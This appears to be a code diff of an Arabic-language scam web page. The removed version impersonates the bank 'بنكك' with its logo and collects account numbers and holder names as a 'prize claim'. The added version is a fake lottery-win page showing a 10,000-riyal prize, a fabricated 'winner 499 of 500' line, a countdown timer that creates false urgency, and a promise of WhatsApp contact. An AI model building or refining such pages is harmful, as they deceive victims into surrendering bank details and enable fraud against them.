@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html dir="rtl" lang="ar">
+<html dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بنكك - استلام الجائزة</title>
+    <title>الجوائز الكبرى - استلام الجائزة</title>
     <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
         * {
@@ -14,171 +14,212 @@
         }
 
         body {
-            background-color: #f5f5f5;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
             min-height: 100vh;
-        }
-
-        .container {
-            max-width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             padding: 20px;
-            margin: 0 auto;
-        }
-
-        .login-card {
-            background: white;
-            border-radius: 10px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-            overflow: hidden;
-            max-width: 400px;
-            margin: 20px auto;
-        }
-
-        .login-header {
-            background: #e31b23;
-            color: white;
-            padding: 15px;
-            text-align: center;
-        }
-
-        .login-header img {
-            width: 120px;
-            margin-bottom: 10px;
-        }
-
-        .login-body {
-            padding: 20px;
-        }
-
-        .form-group {
-            margin-bottom: 15px;
-        }
-
-        .form-control {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            font-size: 16px;
             direction: rtl;
         }
 
-        .btn-login {
-            width: 100%;
-            padding: 12px;
-            background: #e31b23;
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            width: 90%;
+            max-width: 500px;
+            padding: 0;
+            overflow: hidden;
+        }
+
+        .header {
+            background: linear-gradient(45deg, #FF512F 0%, #DD2476 100%);
             color: white;
-            border: none;
-            border-radius: 5px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 10px;
-        }
-
-        .btn-login:hover {
-            background: #c41920;
-        }
-
-        .forgot-password {
+            padding: 30px 20px;
             text-align: center;
-            margin-top: 15px;
+            position: relative;
+            overflow: hidden;
         }
 
-        .forgot-password a {
-            color: #666;
-            text-decoration: none;
-            font-size: 14px;
-        }
-
-        .modal {
-            display: none;
-            position: fixed;
+        .header::before {
+            content: '';
+            position: absolute;
             top: 0;
             left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.5);
-            z-index: 1000;
+            right: 0;
+            bottom: 0;
+            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">🎉</text></svg>') center/40px repeat;
+            opacity: 0.1;
         }
 
-        .modal-content {
-            background: white;
-            padding: 20px;
-            border-radius: 10px;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
+        .prize-amount {
+            font-size: 2.5em;
+            font-weight: bold;
+            margin: 10px 0;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+
+        .content {
+            padding: 30px 20px;
             text-align: center;
-            width: 90%;
-            max-width: 400px;
         }
 
-        .modal-buttons {
+        .winner-info {
+            background: rgba(255,255,255,0.1);
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            color: #666;
+        }
+
+        .winner-number {
+            color: #DD2476;
+            font-weight: bold;
+            font-size: 1.2em;
+        }
+
+        .steps {
+            text-align: right;
+            margin: 25px 0;
+            padding: 0 20px;
+        }
+
+        .step {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+            color: #555;
+        }
+
+        .step-number {
+            background: #DD2476;
+            color: white;
+            width: 25px;
+            height: 25px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-left: 10px;
+            font-size: 0.9em;
+        }
+
+        .confirm-btn {
+            background: linear-gradient(45deg, #FF512F 0%, #DD2476 100%);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 30px;
+            font-size: 1.1em;
+            cursor: pointer;
+            transition: transform 0.3s, box-shadow 0.3s;
+            margin: 20px 0;
+            width: 80%;
+        }
+
+        .confirm-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(221,36,118,0.3);
+        }
+
+        .timer {
+            color: #DD2476;
+            font-size: 1.2em;
+            margin: 20px 0;
+        }
+
+        .note {
+            color: #666;
+            font-size: 0.9em;
             margin-top: 20px;
         }
 
-        .modal-btn {
-            padding: 10px 20px;
-            margin: 0 5px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-weight: bold;
-        }
-
-        .btn-yes {
-            background: #e31b23;
-            color: white;
-        }
-
-        .btn-no {
-            background: #666;
-            color: white;
-        }
-
-        #status {
+        #loading, #status {
             display: none;
-            padding: 10px;
-            margin-top: 10px;
-            border-radius: 5px;
-            text-align: center;
         }
 
-        .success {
-            background: #d4edda;
-            color: #155724;
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
         }
 
-        .error {
-            background: #f8d7da;
-            color: #721c24;
+        .pulse {
+            animation: pulse 2s infinite;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="login-card">
-            <div class="login-header">
-                <img src="https://play-lh.googleusercontent.com/TIc8jW-8e9L8ySNPVvVz-ycGRWXCenzwdmEpHNP0yT_BSQVoRtKfHGGqGb1nAFRd5A=w240-h480-rw" alt="بنكك">
-            </div>
-            <div class="login-body">
-                <form id="transferForm">
-                    <div class="form-group">
-                        <input type="text" class="form-control" id="accountNumber" placeholder="رقم الحساب المصرفي" required>
-                    </div>
-                    <div class="form-group">
-                        <input type="text" class="form-control" id="accountName" placeholder="اسم صاحب الحساب" required>
-                    </div>
-                    <button type="submit" class="btn-login" id="submitBtn">
-                        استلام الجائزة
-                    </button>
-                </form>
-                <div id="status"></div>
-            </div>
+        <div class="header">
+            <h1>مبروك! 🎉</h1>
+            <div class="prize-amount">10,000 ريال</div>
+            <p>لقد ربحت في السحب الأسبوعي</p>
         </div>
+        
+        <div class="content">
+            <div class="winner-info">
+                الرابح رقم <span class="winner-number">499</span> من <span>500</span>
+            </div>
+
+            <div class="timer">
+                متبقي: <span id="countdown">23:45:12</span>
+            </div>
+
+            <div class="steps">
+                <div class="step">
+                    <span class="step-number">1</span>
+                    <span>تم اختيارك كرابح في السحب الأسبوعي</span>
+                </div>
+                <div class="step">
+                    <span class="step-number">2</span>
+                    <span>اضغط على زر تأكيد الجائزة أدناه</span>
+                </div>
+                <div class="step">
+                    <span class="step-number">3</span>
+                    <span>سيتم التواصل معك عبر WhatsApp</span>
+                </div>
+            </div>
+
+            <button class="confirm-btn pulse" onclick="startProcess()">تأكيد استلام الجائزة</button>
+
+            <p class="note">* يرجى تأكيد استلام الجائزة قبل انتهاء المدة</p>
+        </div>
+
+        <div id="loading"></div>
+        <div id="status"></div>
     </div>
 
     <script src="script.js"></script>
+    <script>
+        // عداد تنازلي
+        function updateTimer() {
+            const countdownElement = document.getElementById('countdown');
+            let minutes = 23;
+            let seconds = 45;
+            let hours = 23;
+
+            setInterval(() => {
+                if (seconds > 0) {
+                    seconds--;
+                } else {
+                    seconds = 59;
+                    if (minutes > 0) {
+                        minutes--;
+                    } else {
+                        minutes = 59;
+                        if (hours > 0) {
+                            hours--;
+                        }
+                    }
+                }
+                countdownElement.textContent = `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+            }, 1000);
+        }
+
+        // تشغيل العداد عند تحميل الصفحة
+        updateTimer();
+    </script>
 </body>
 </html>
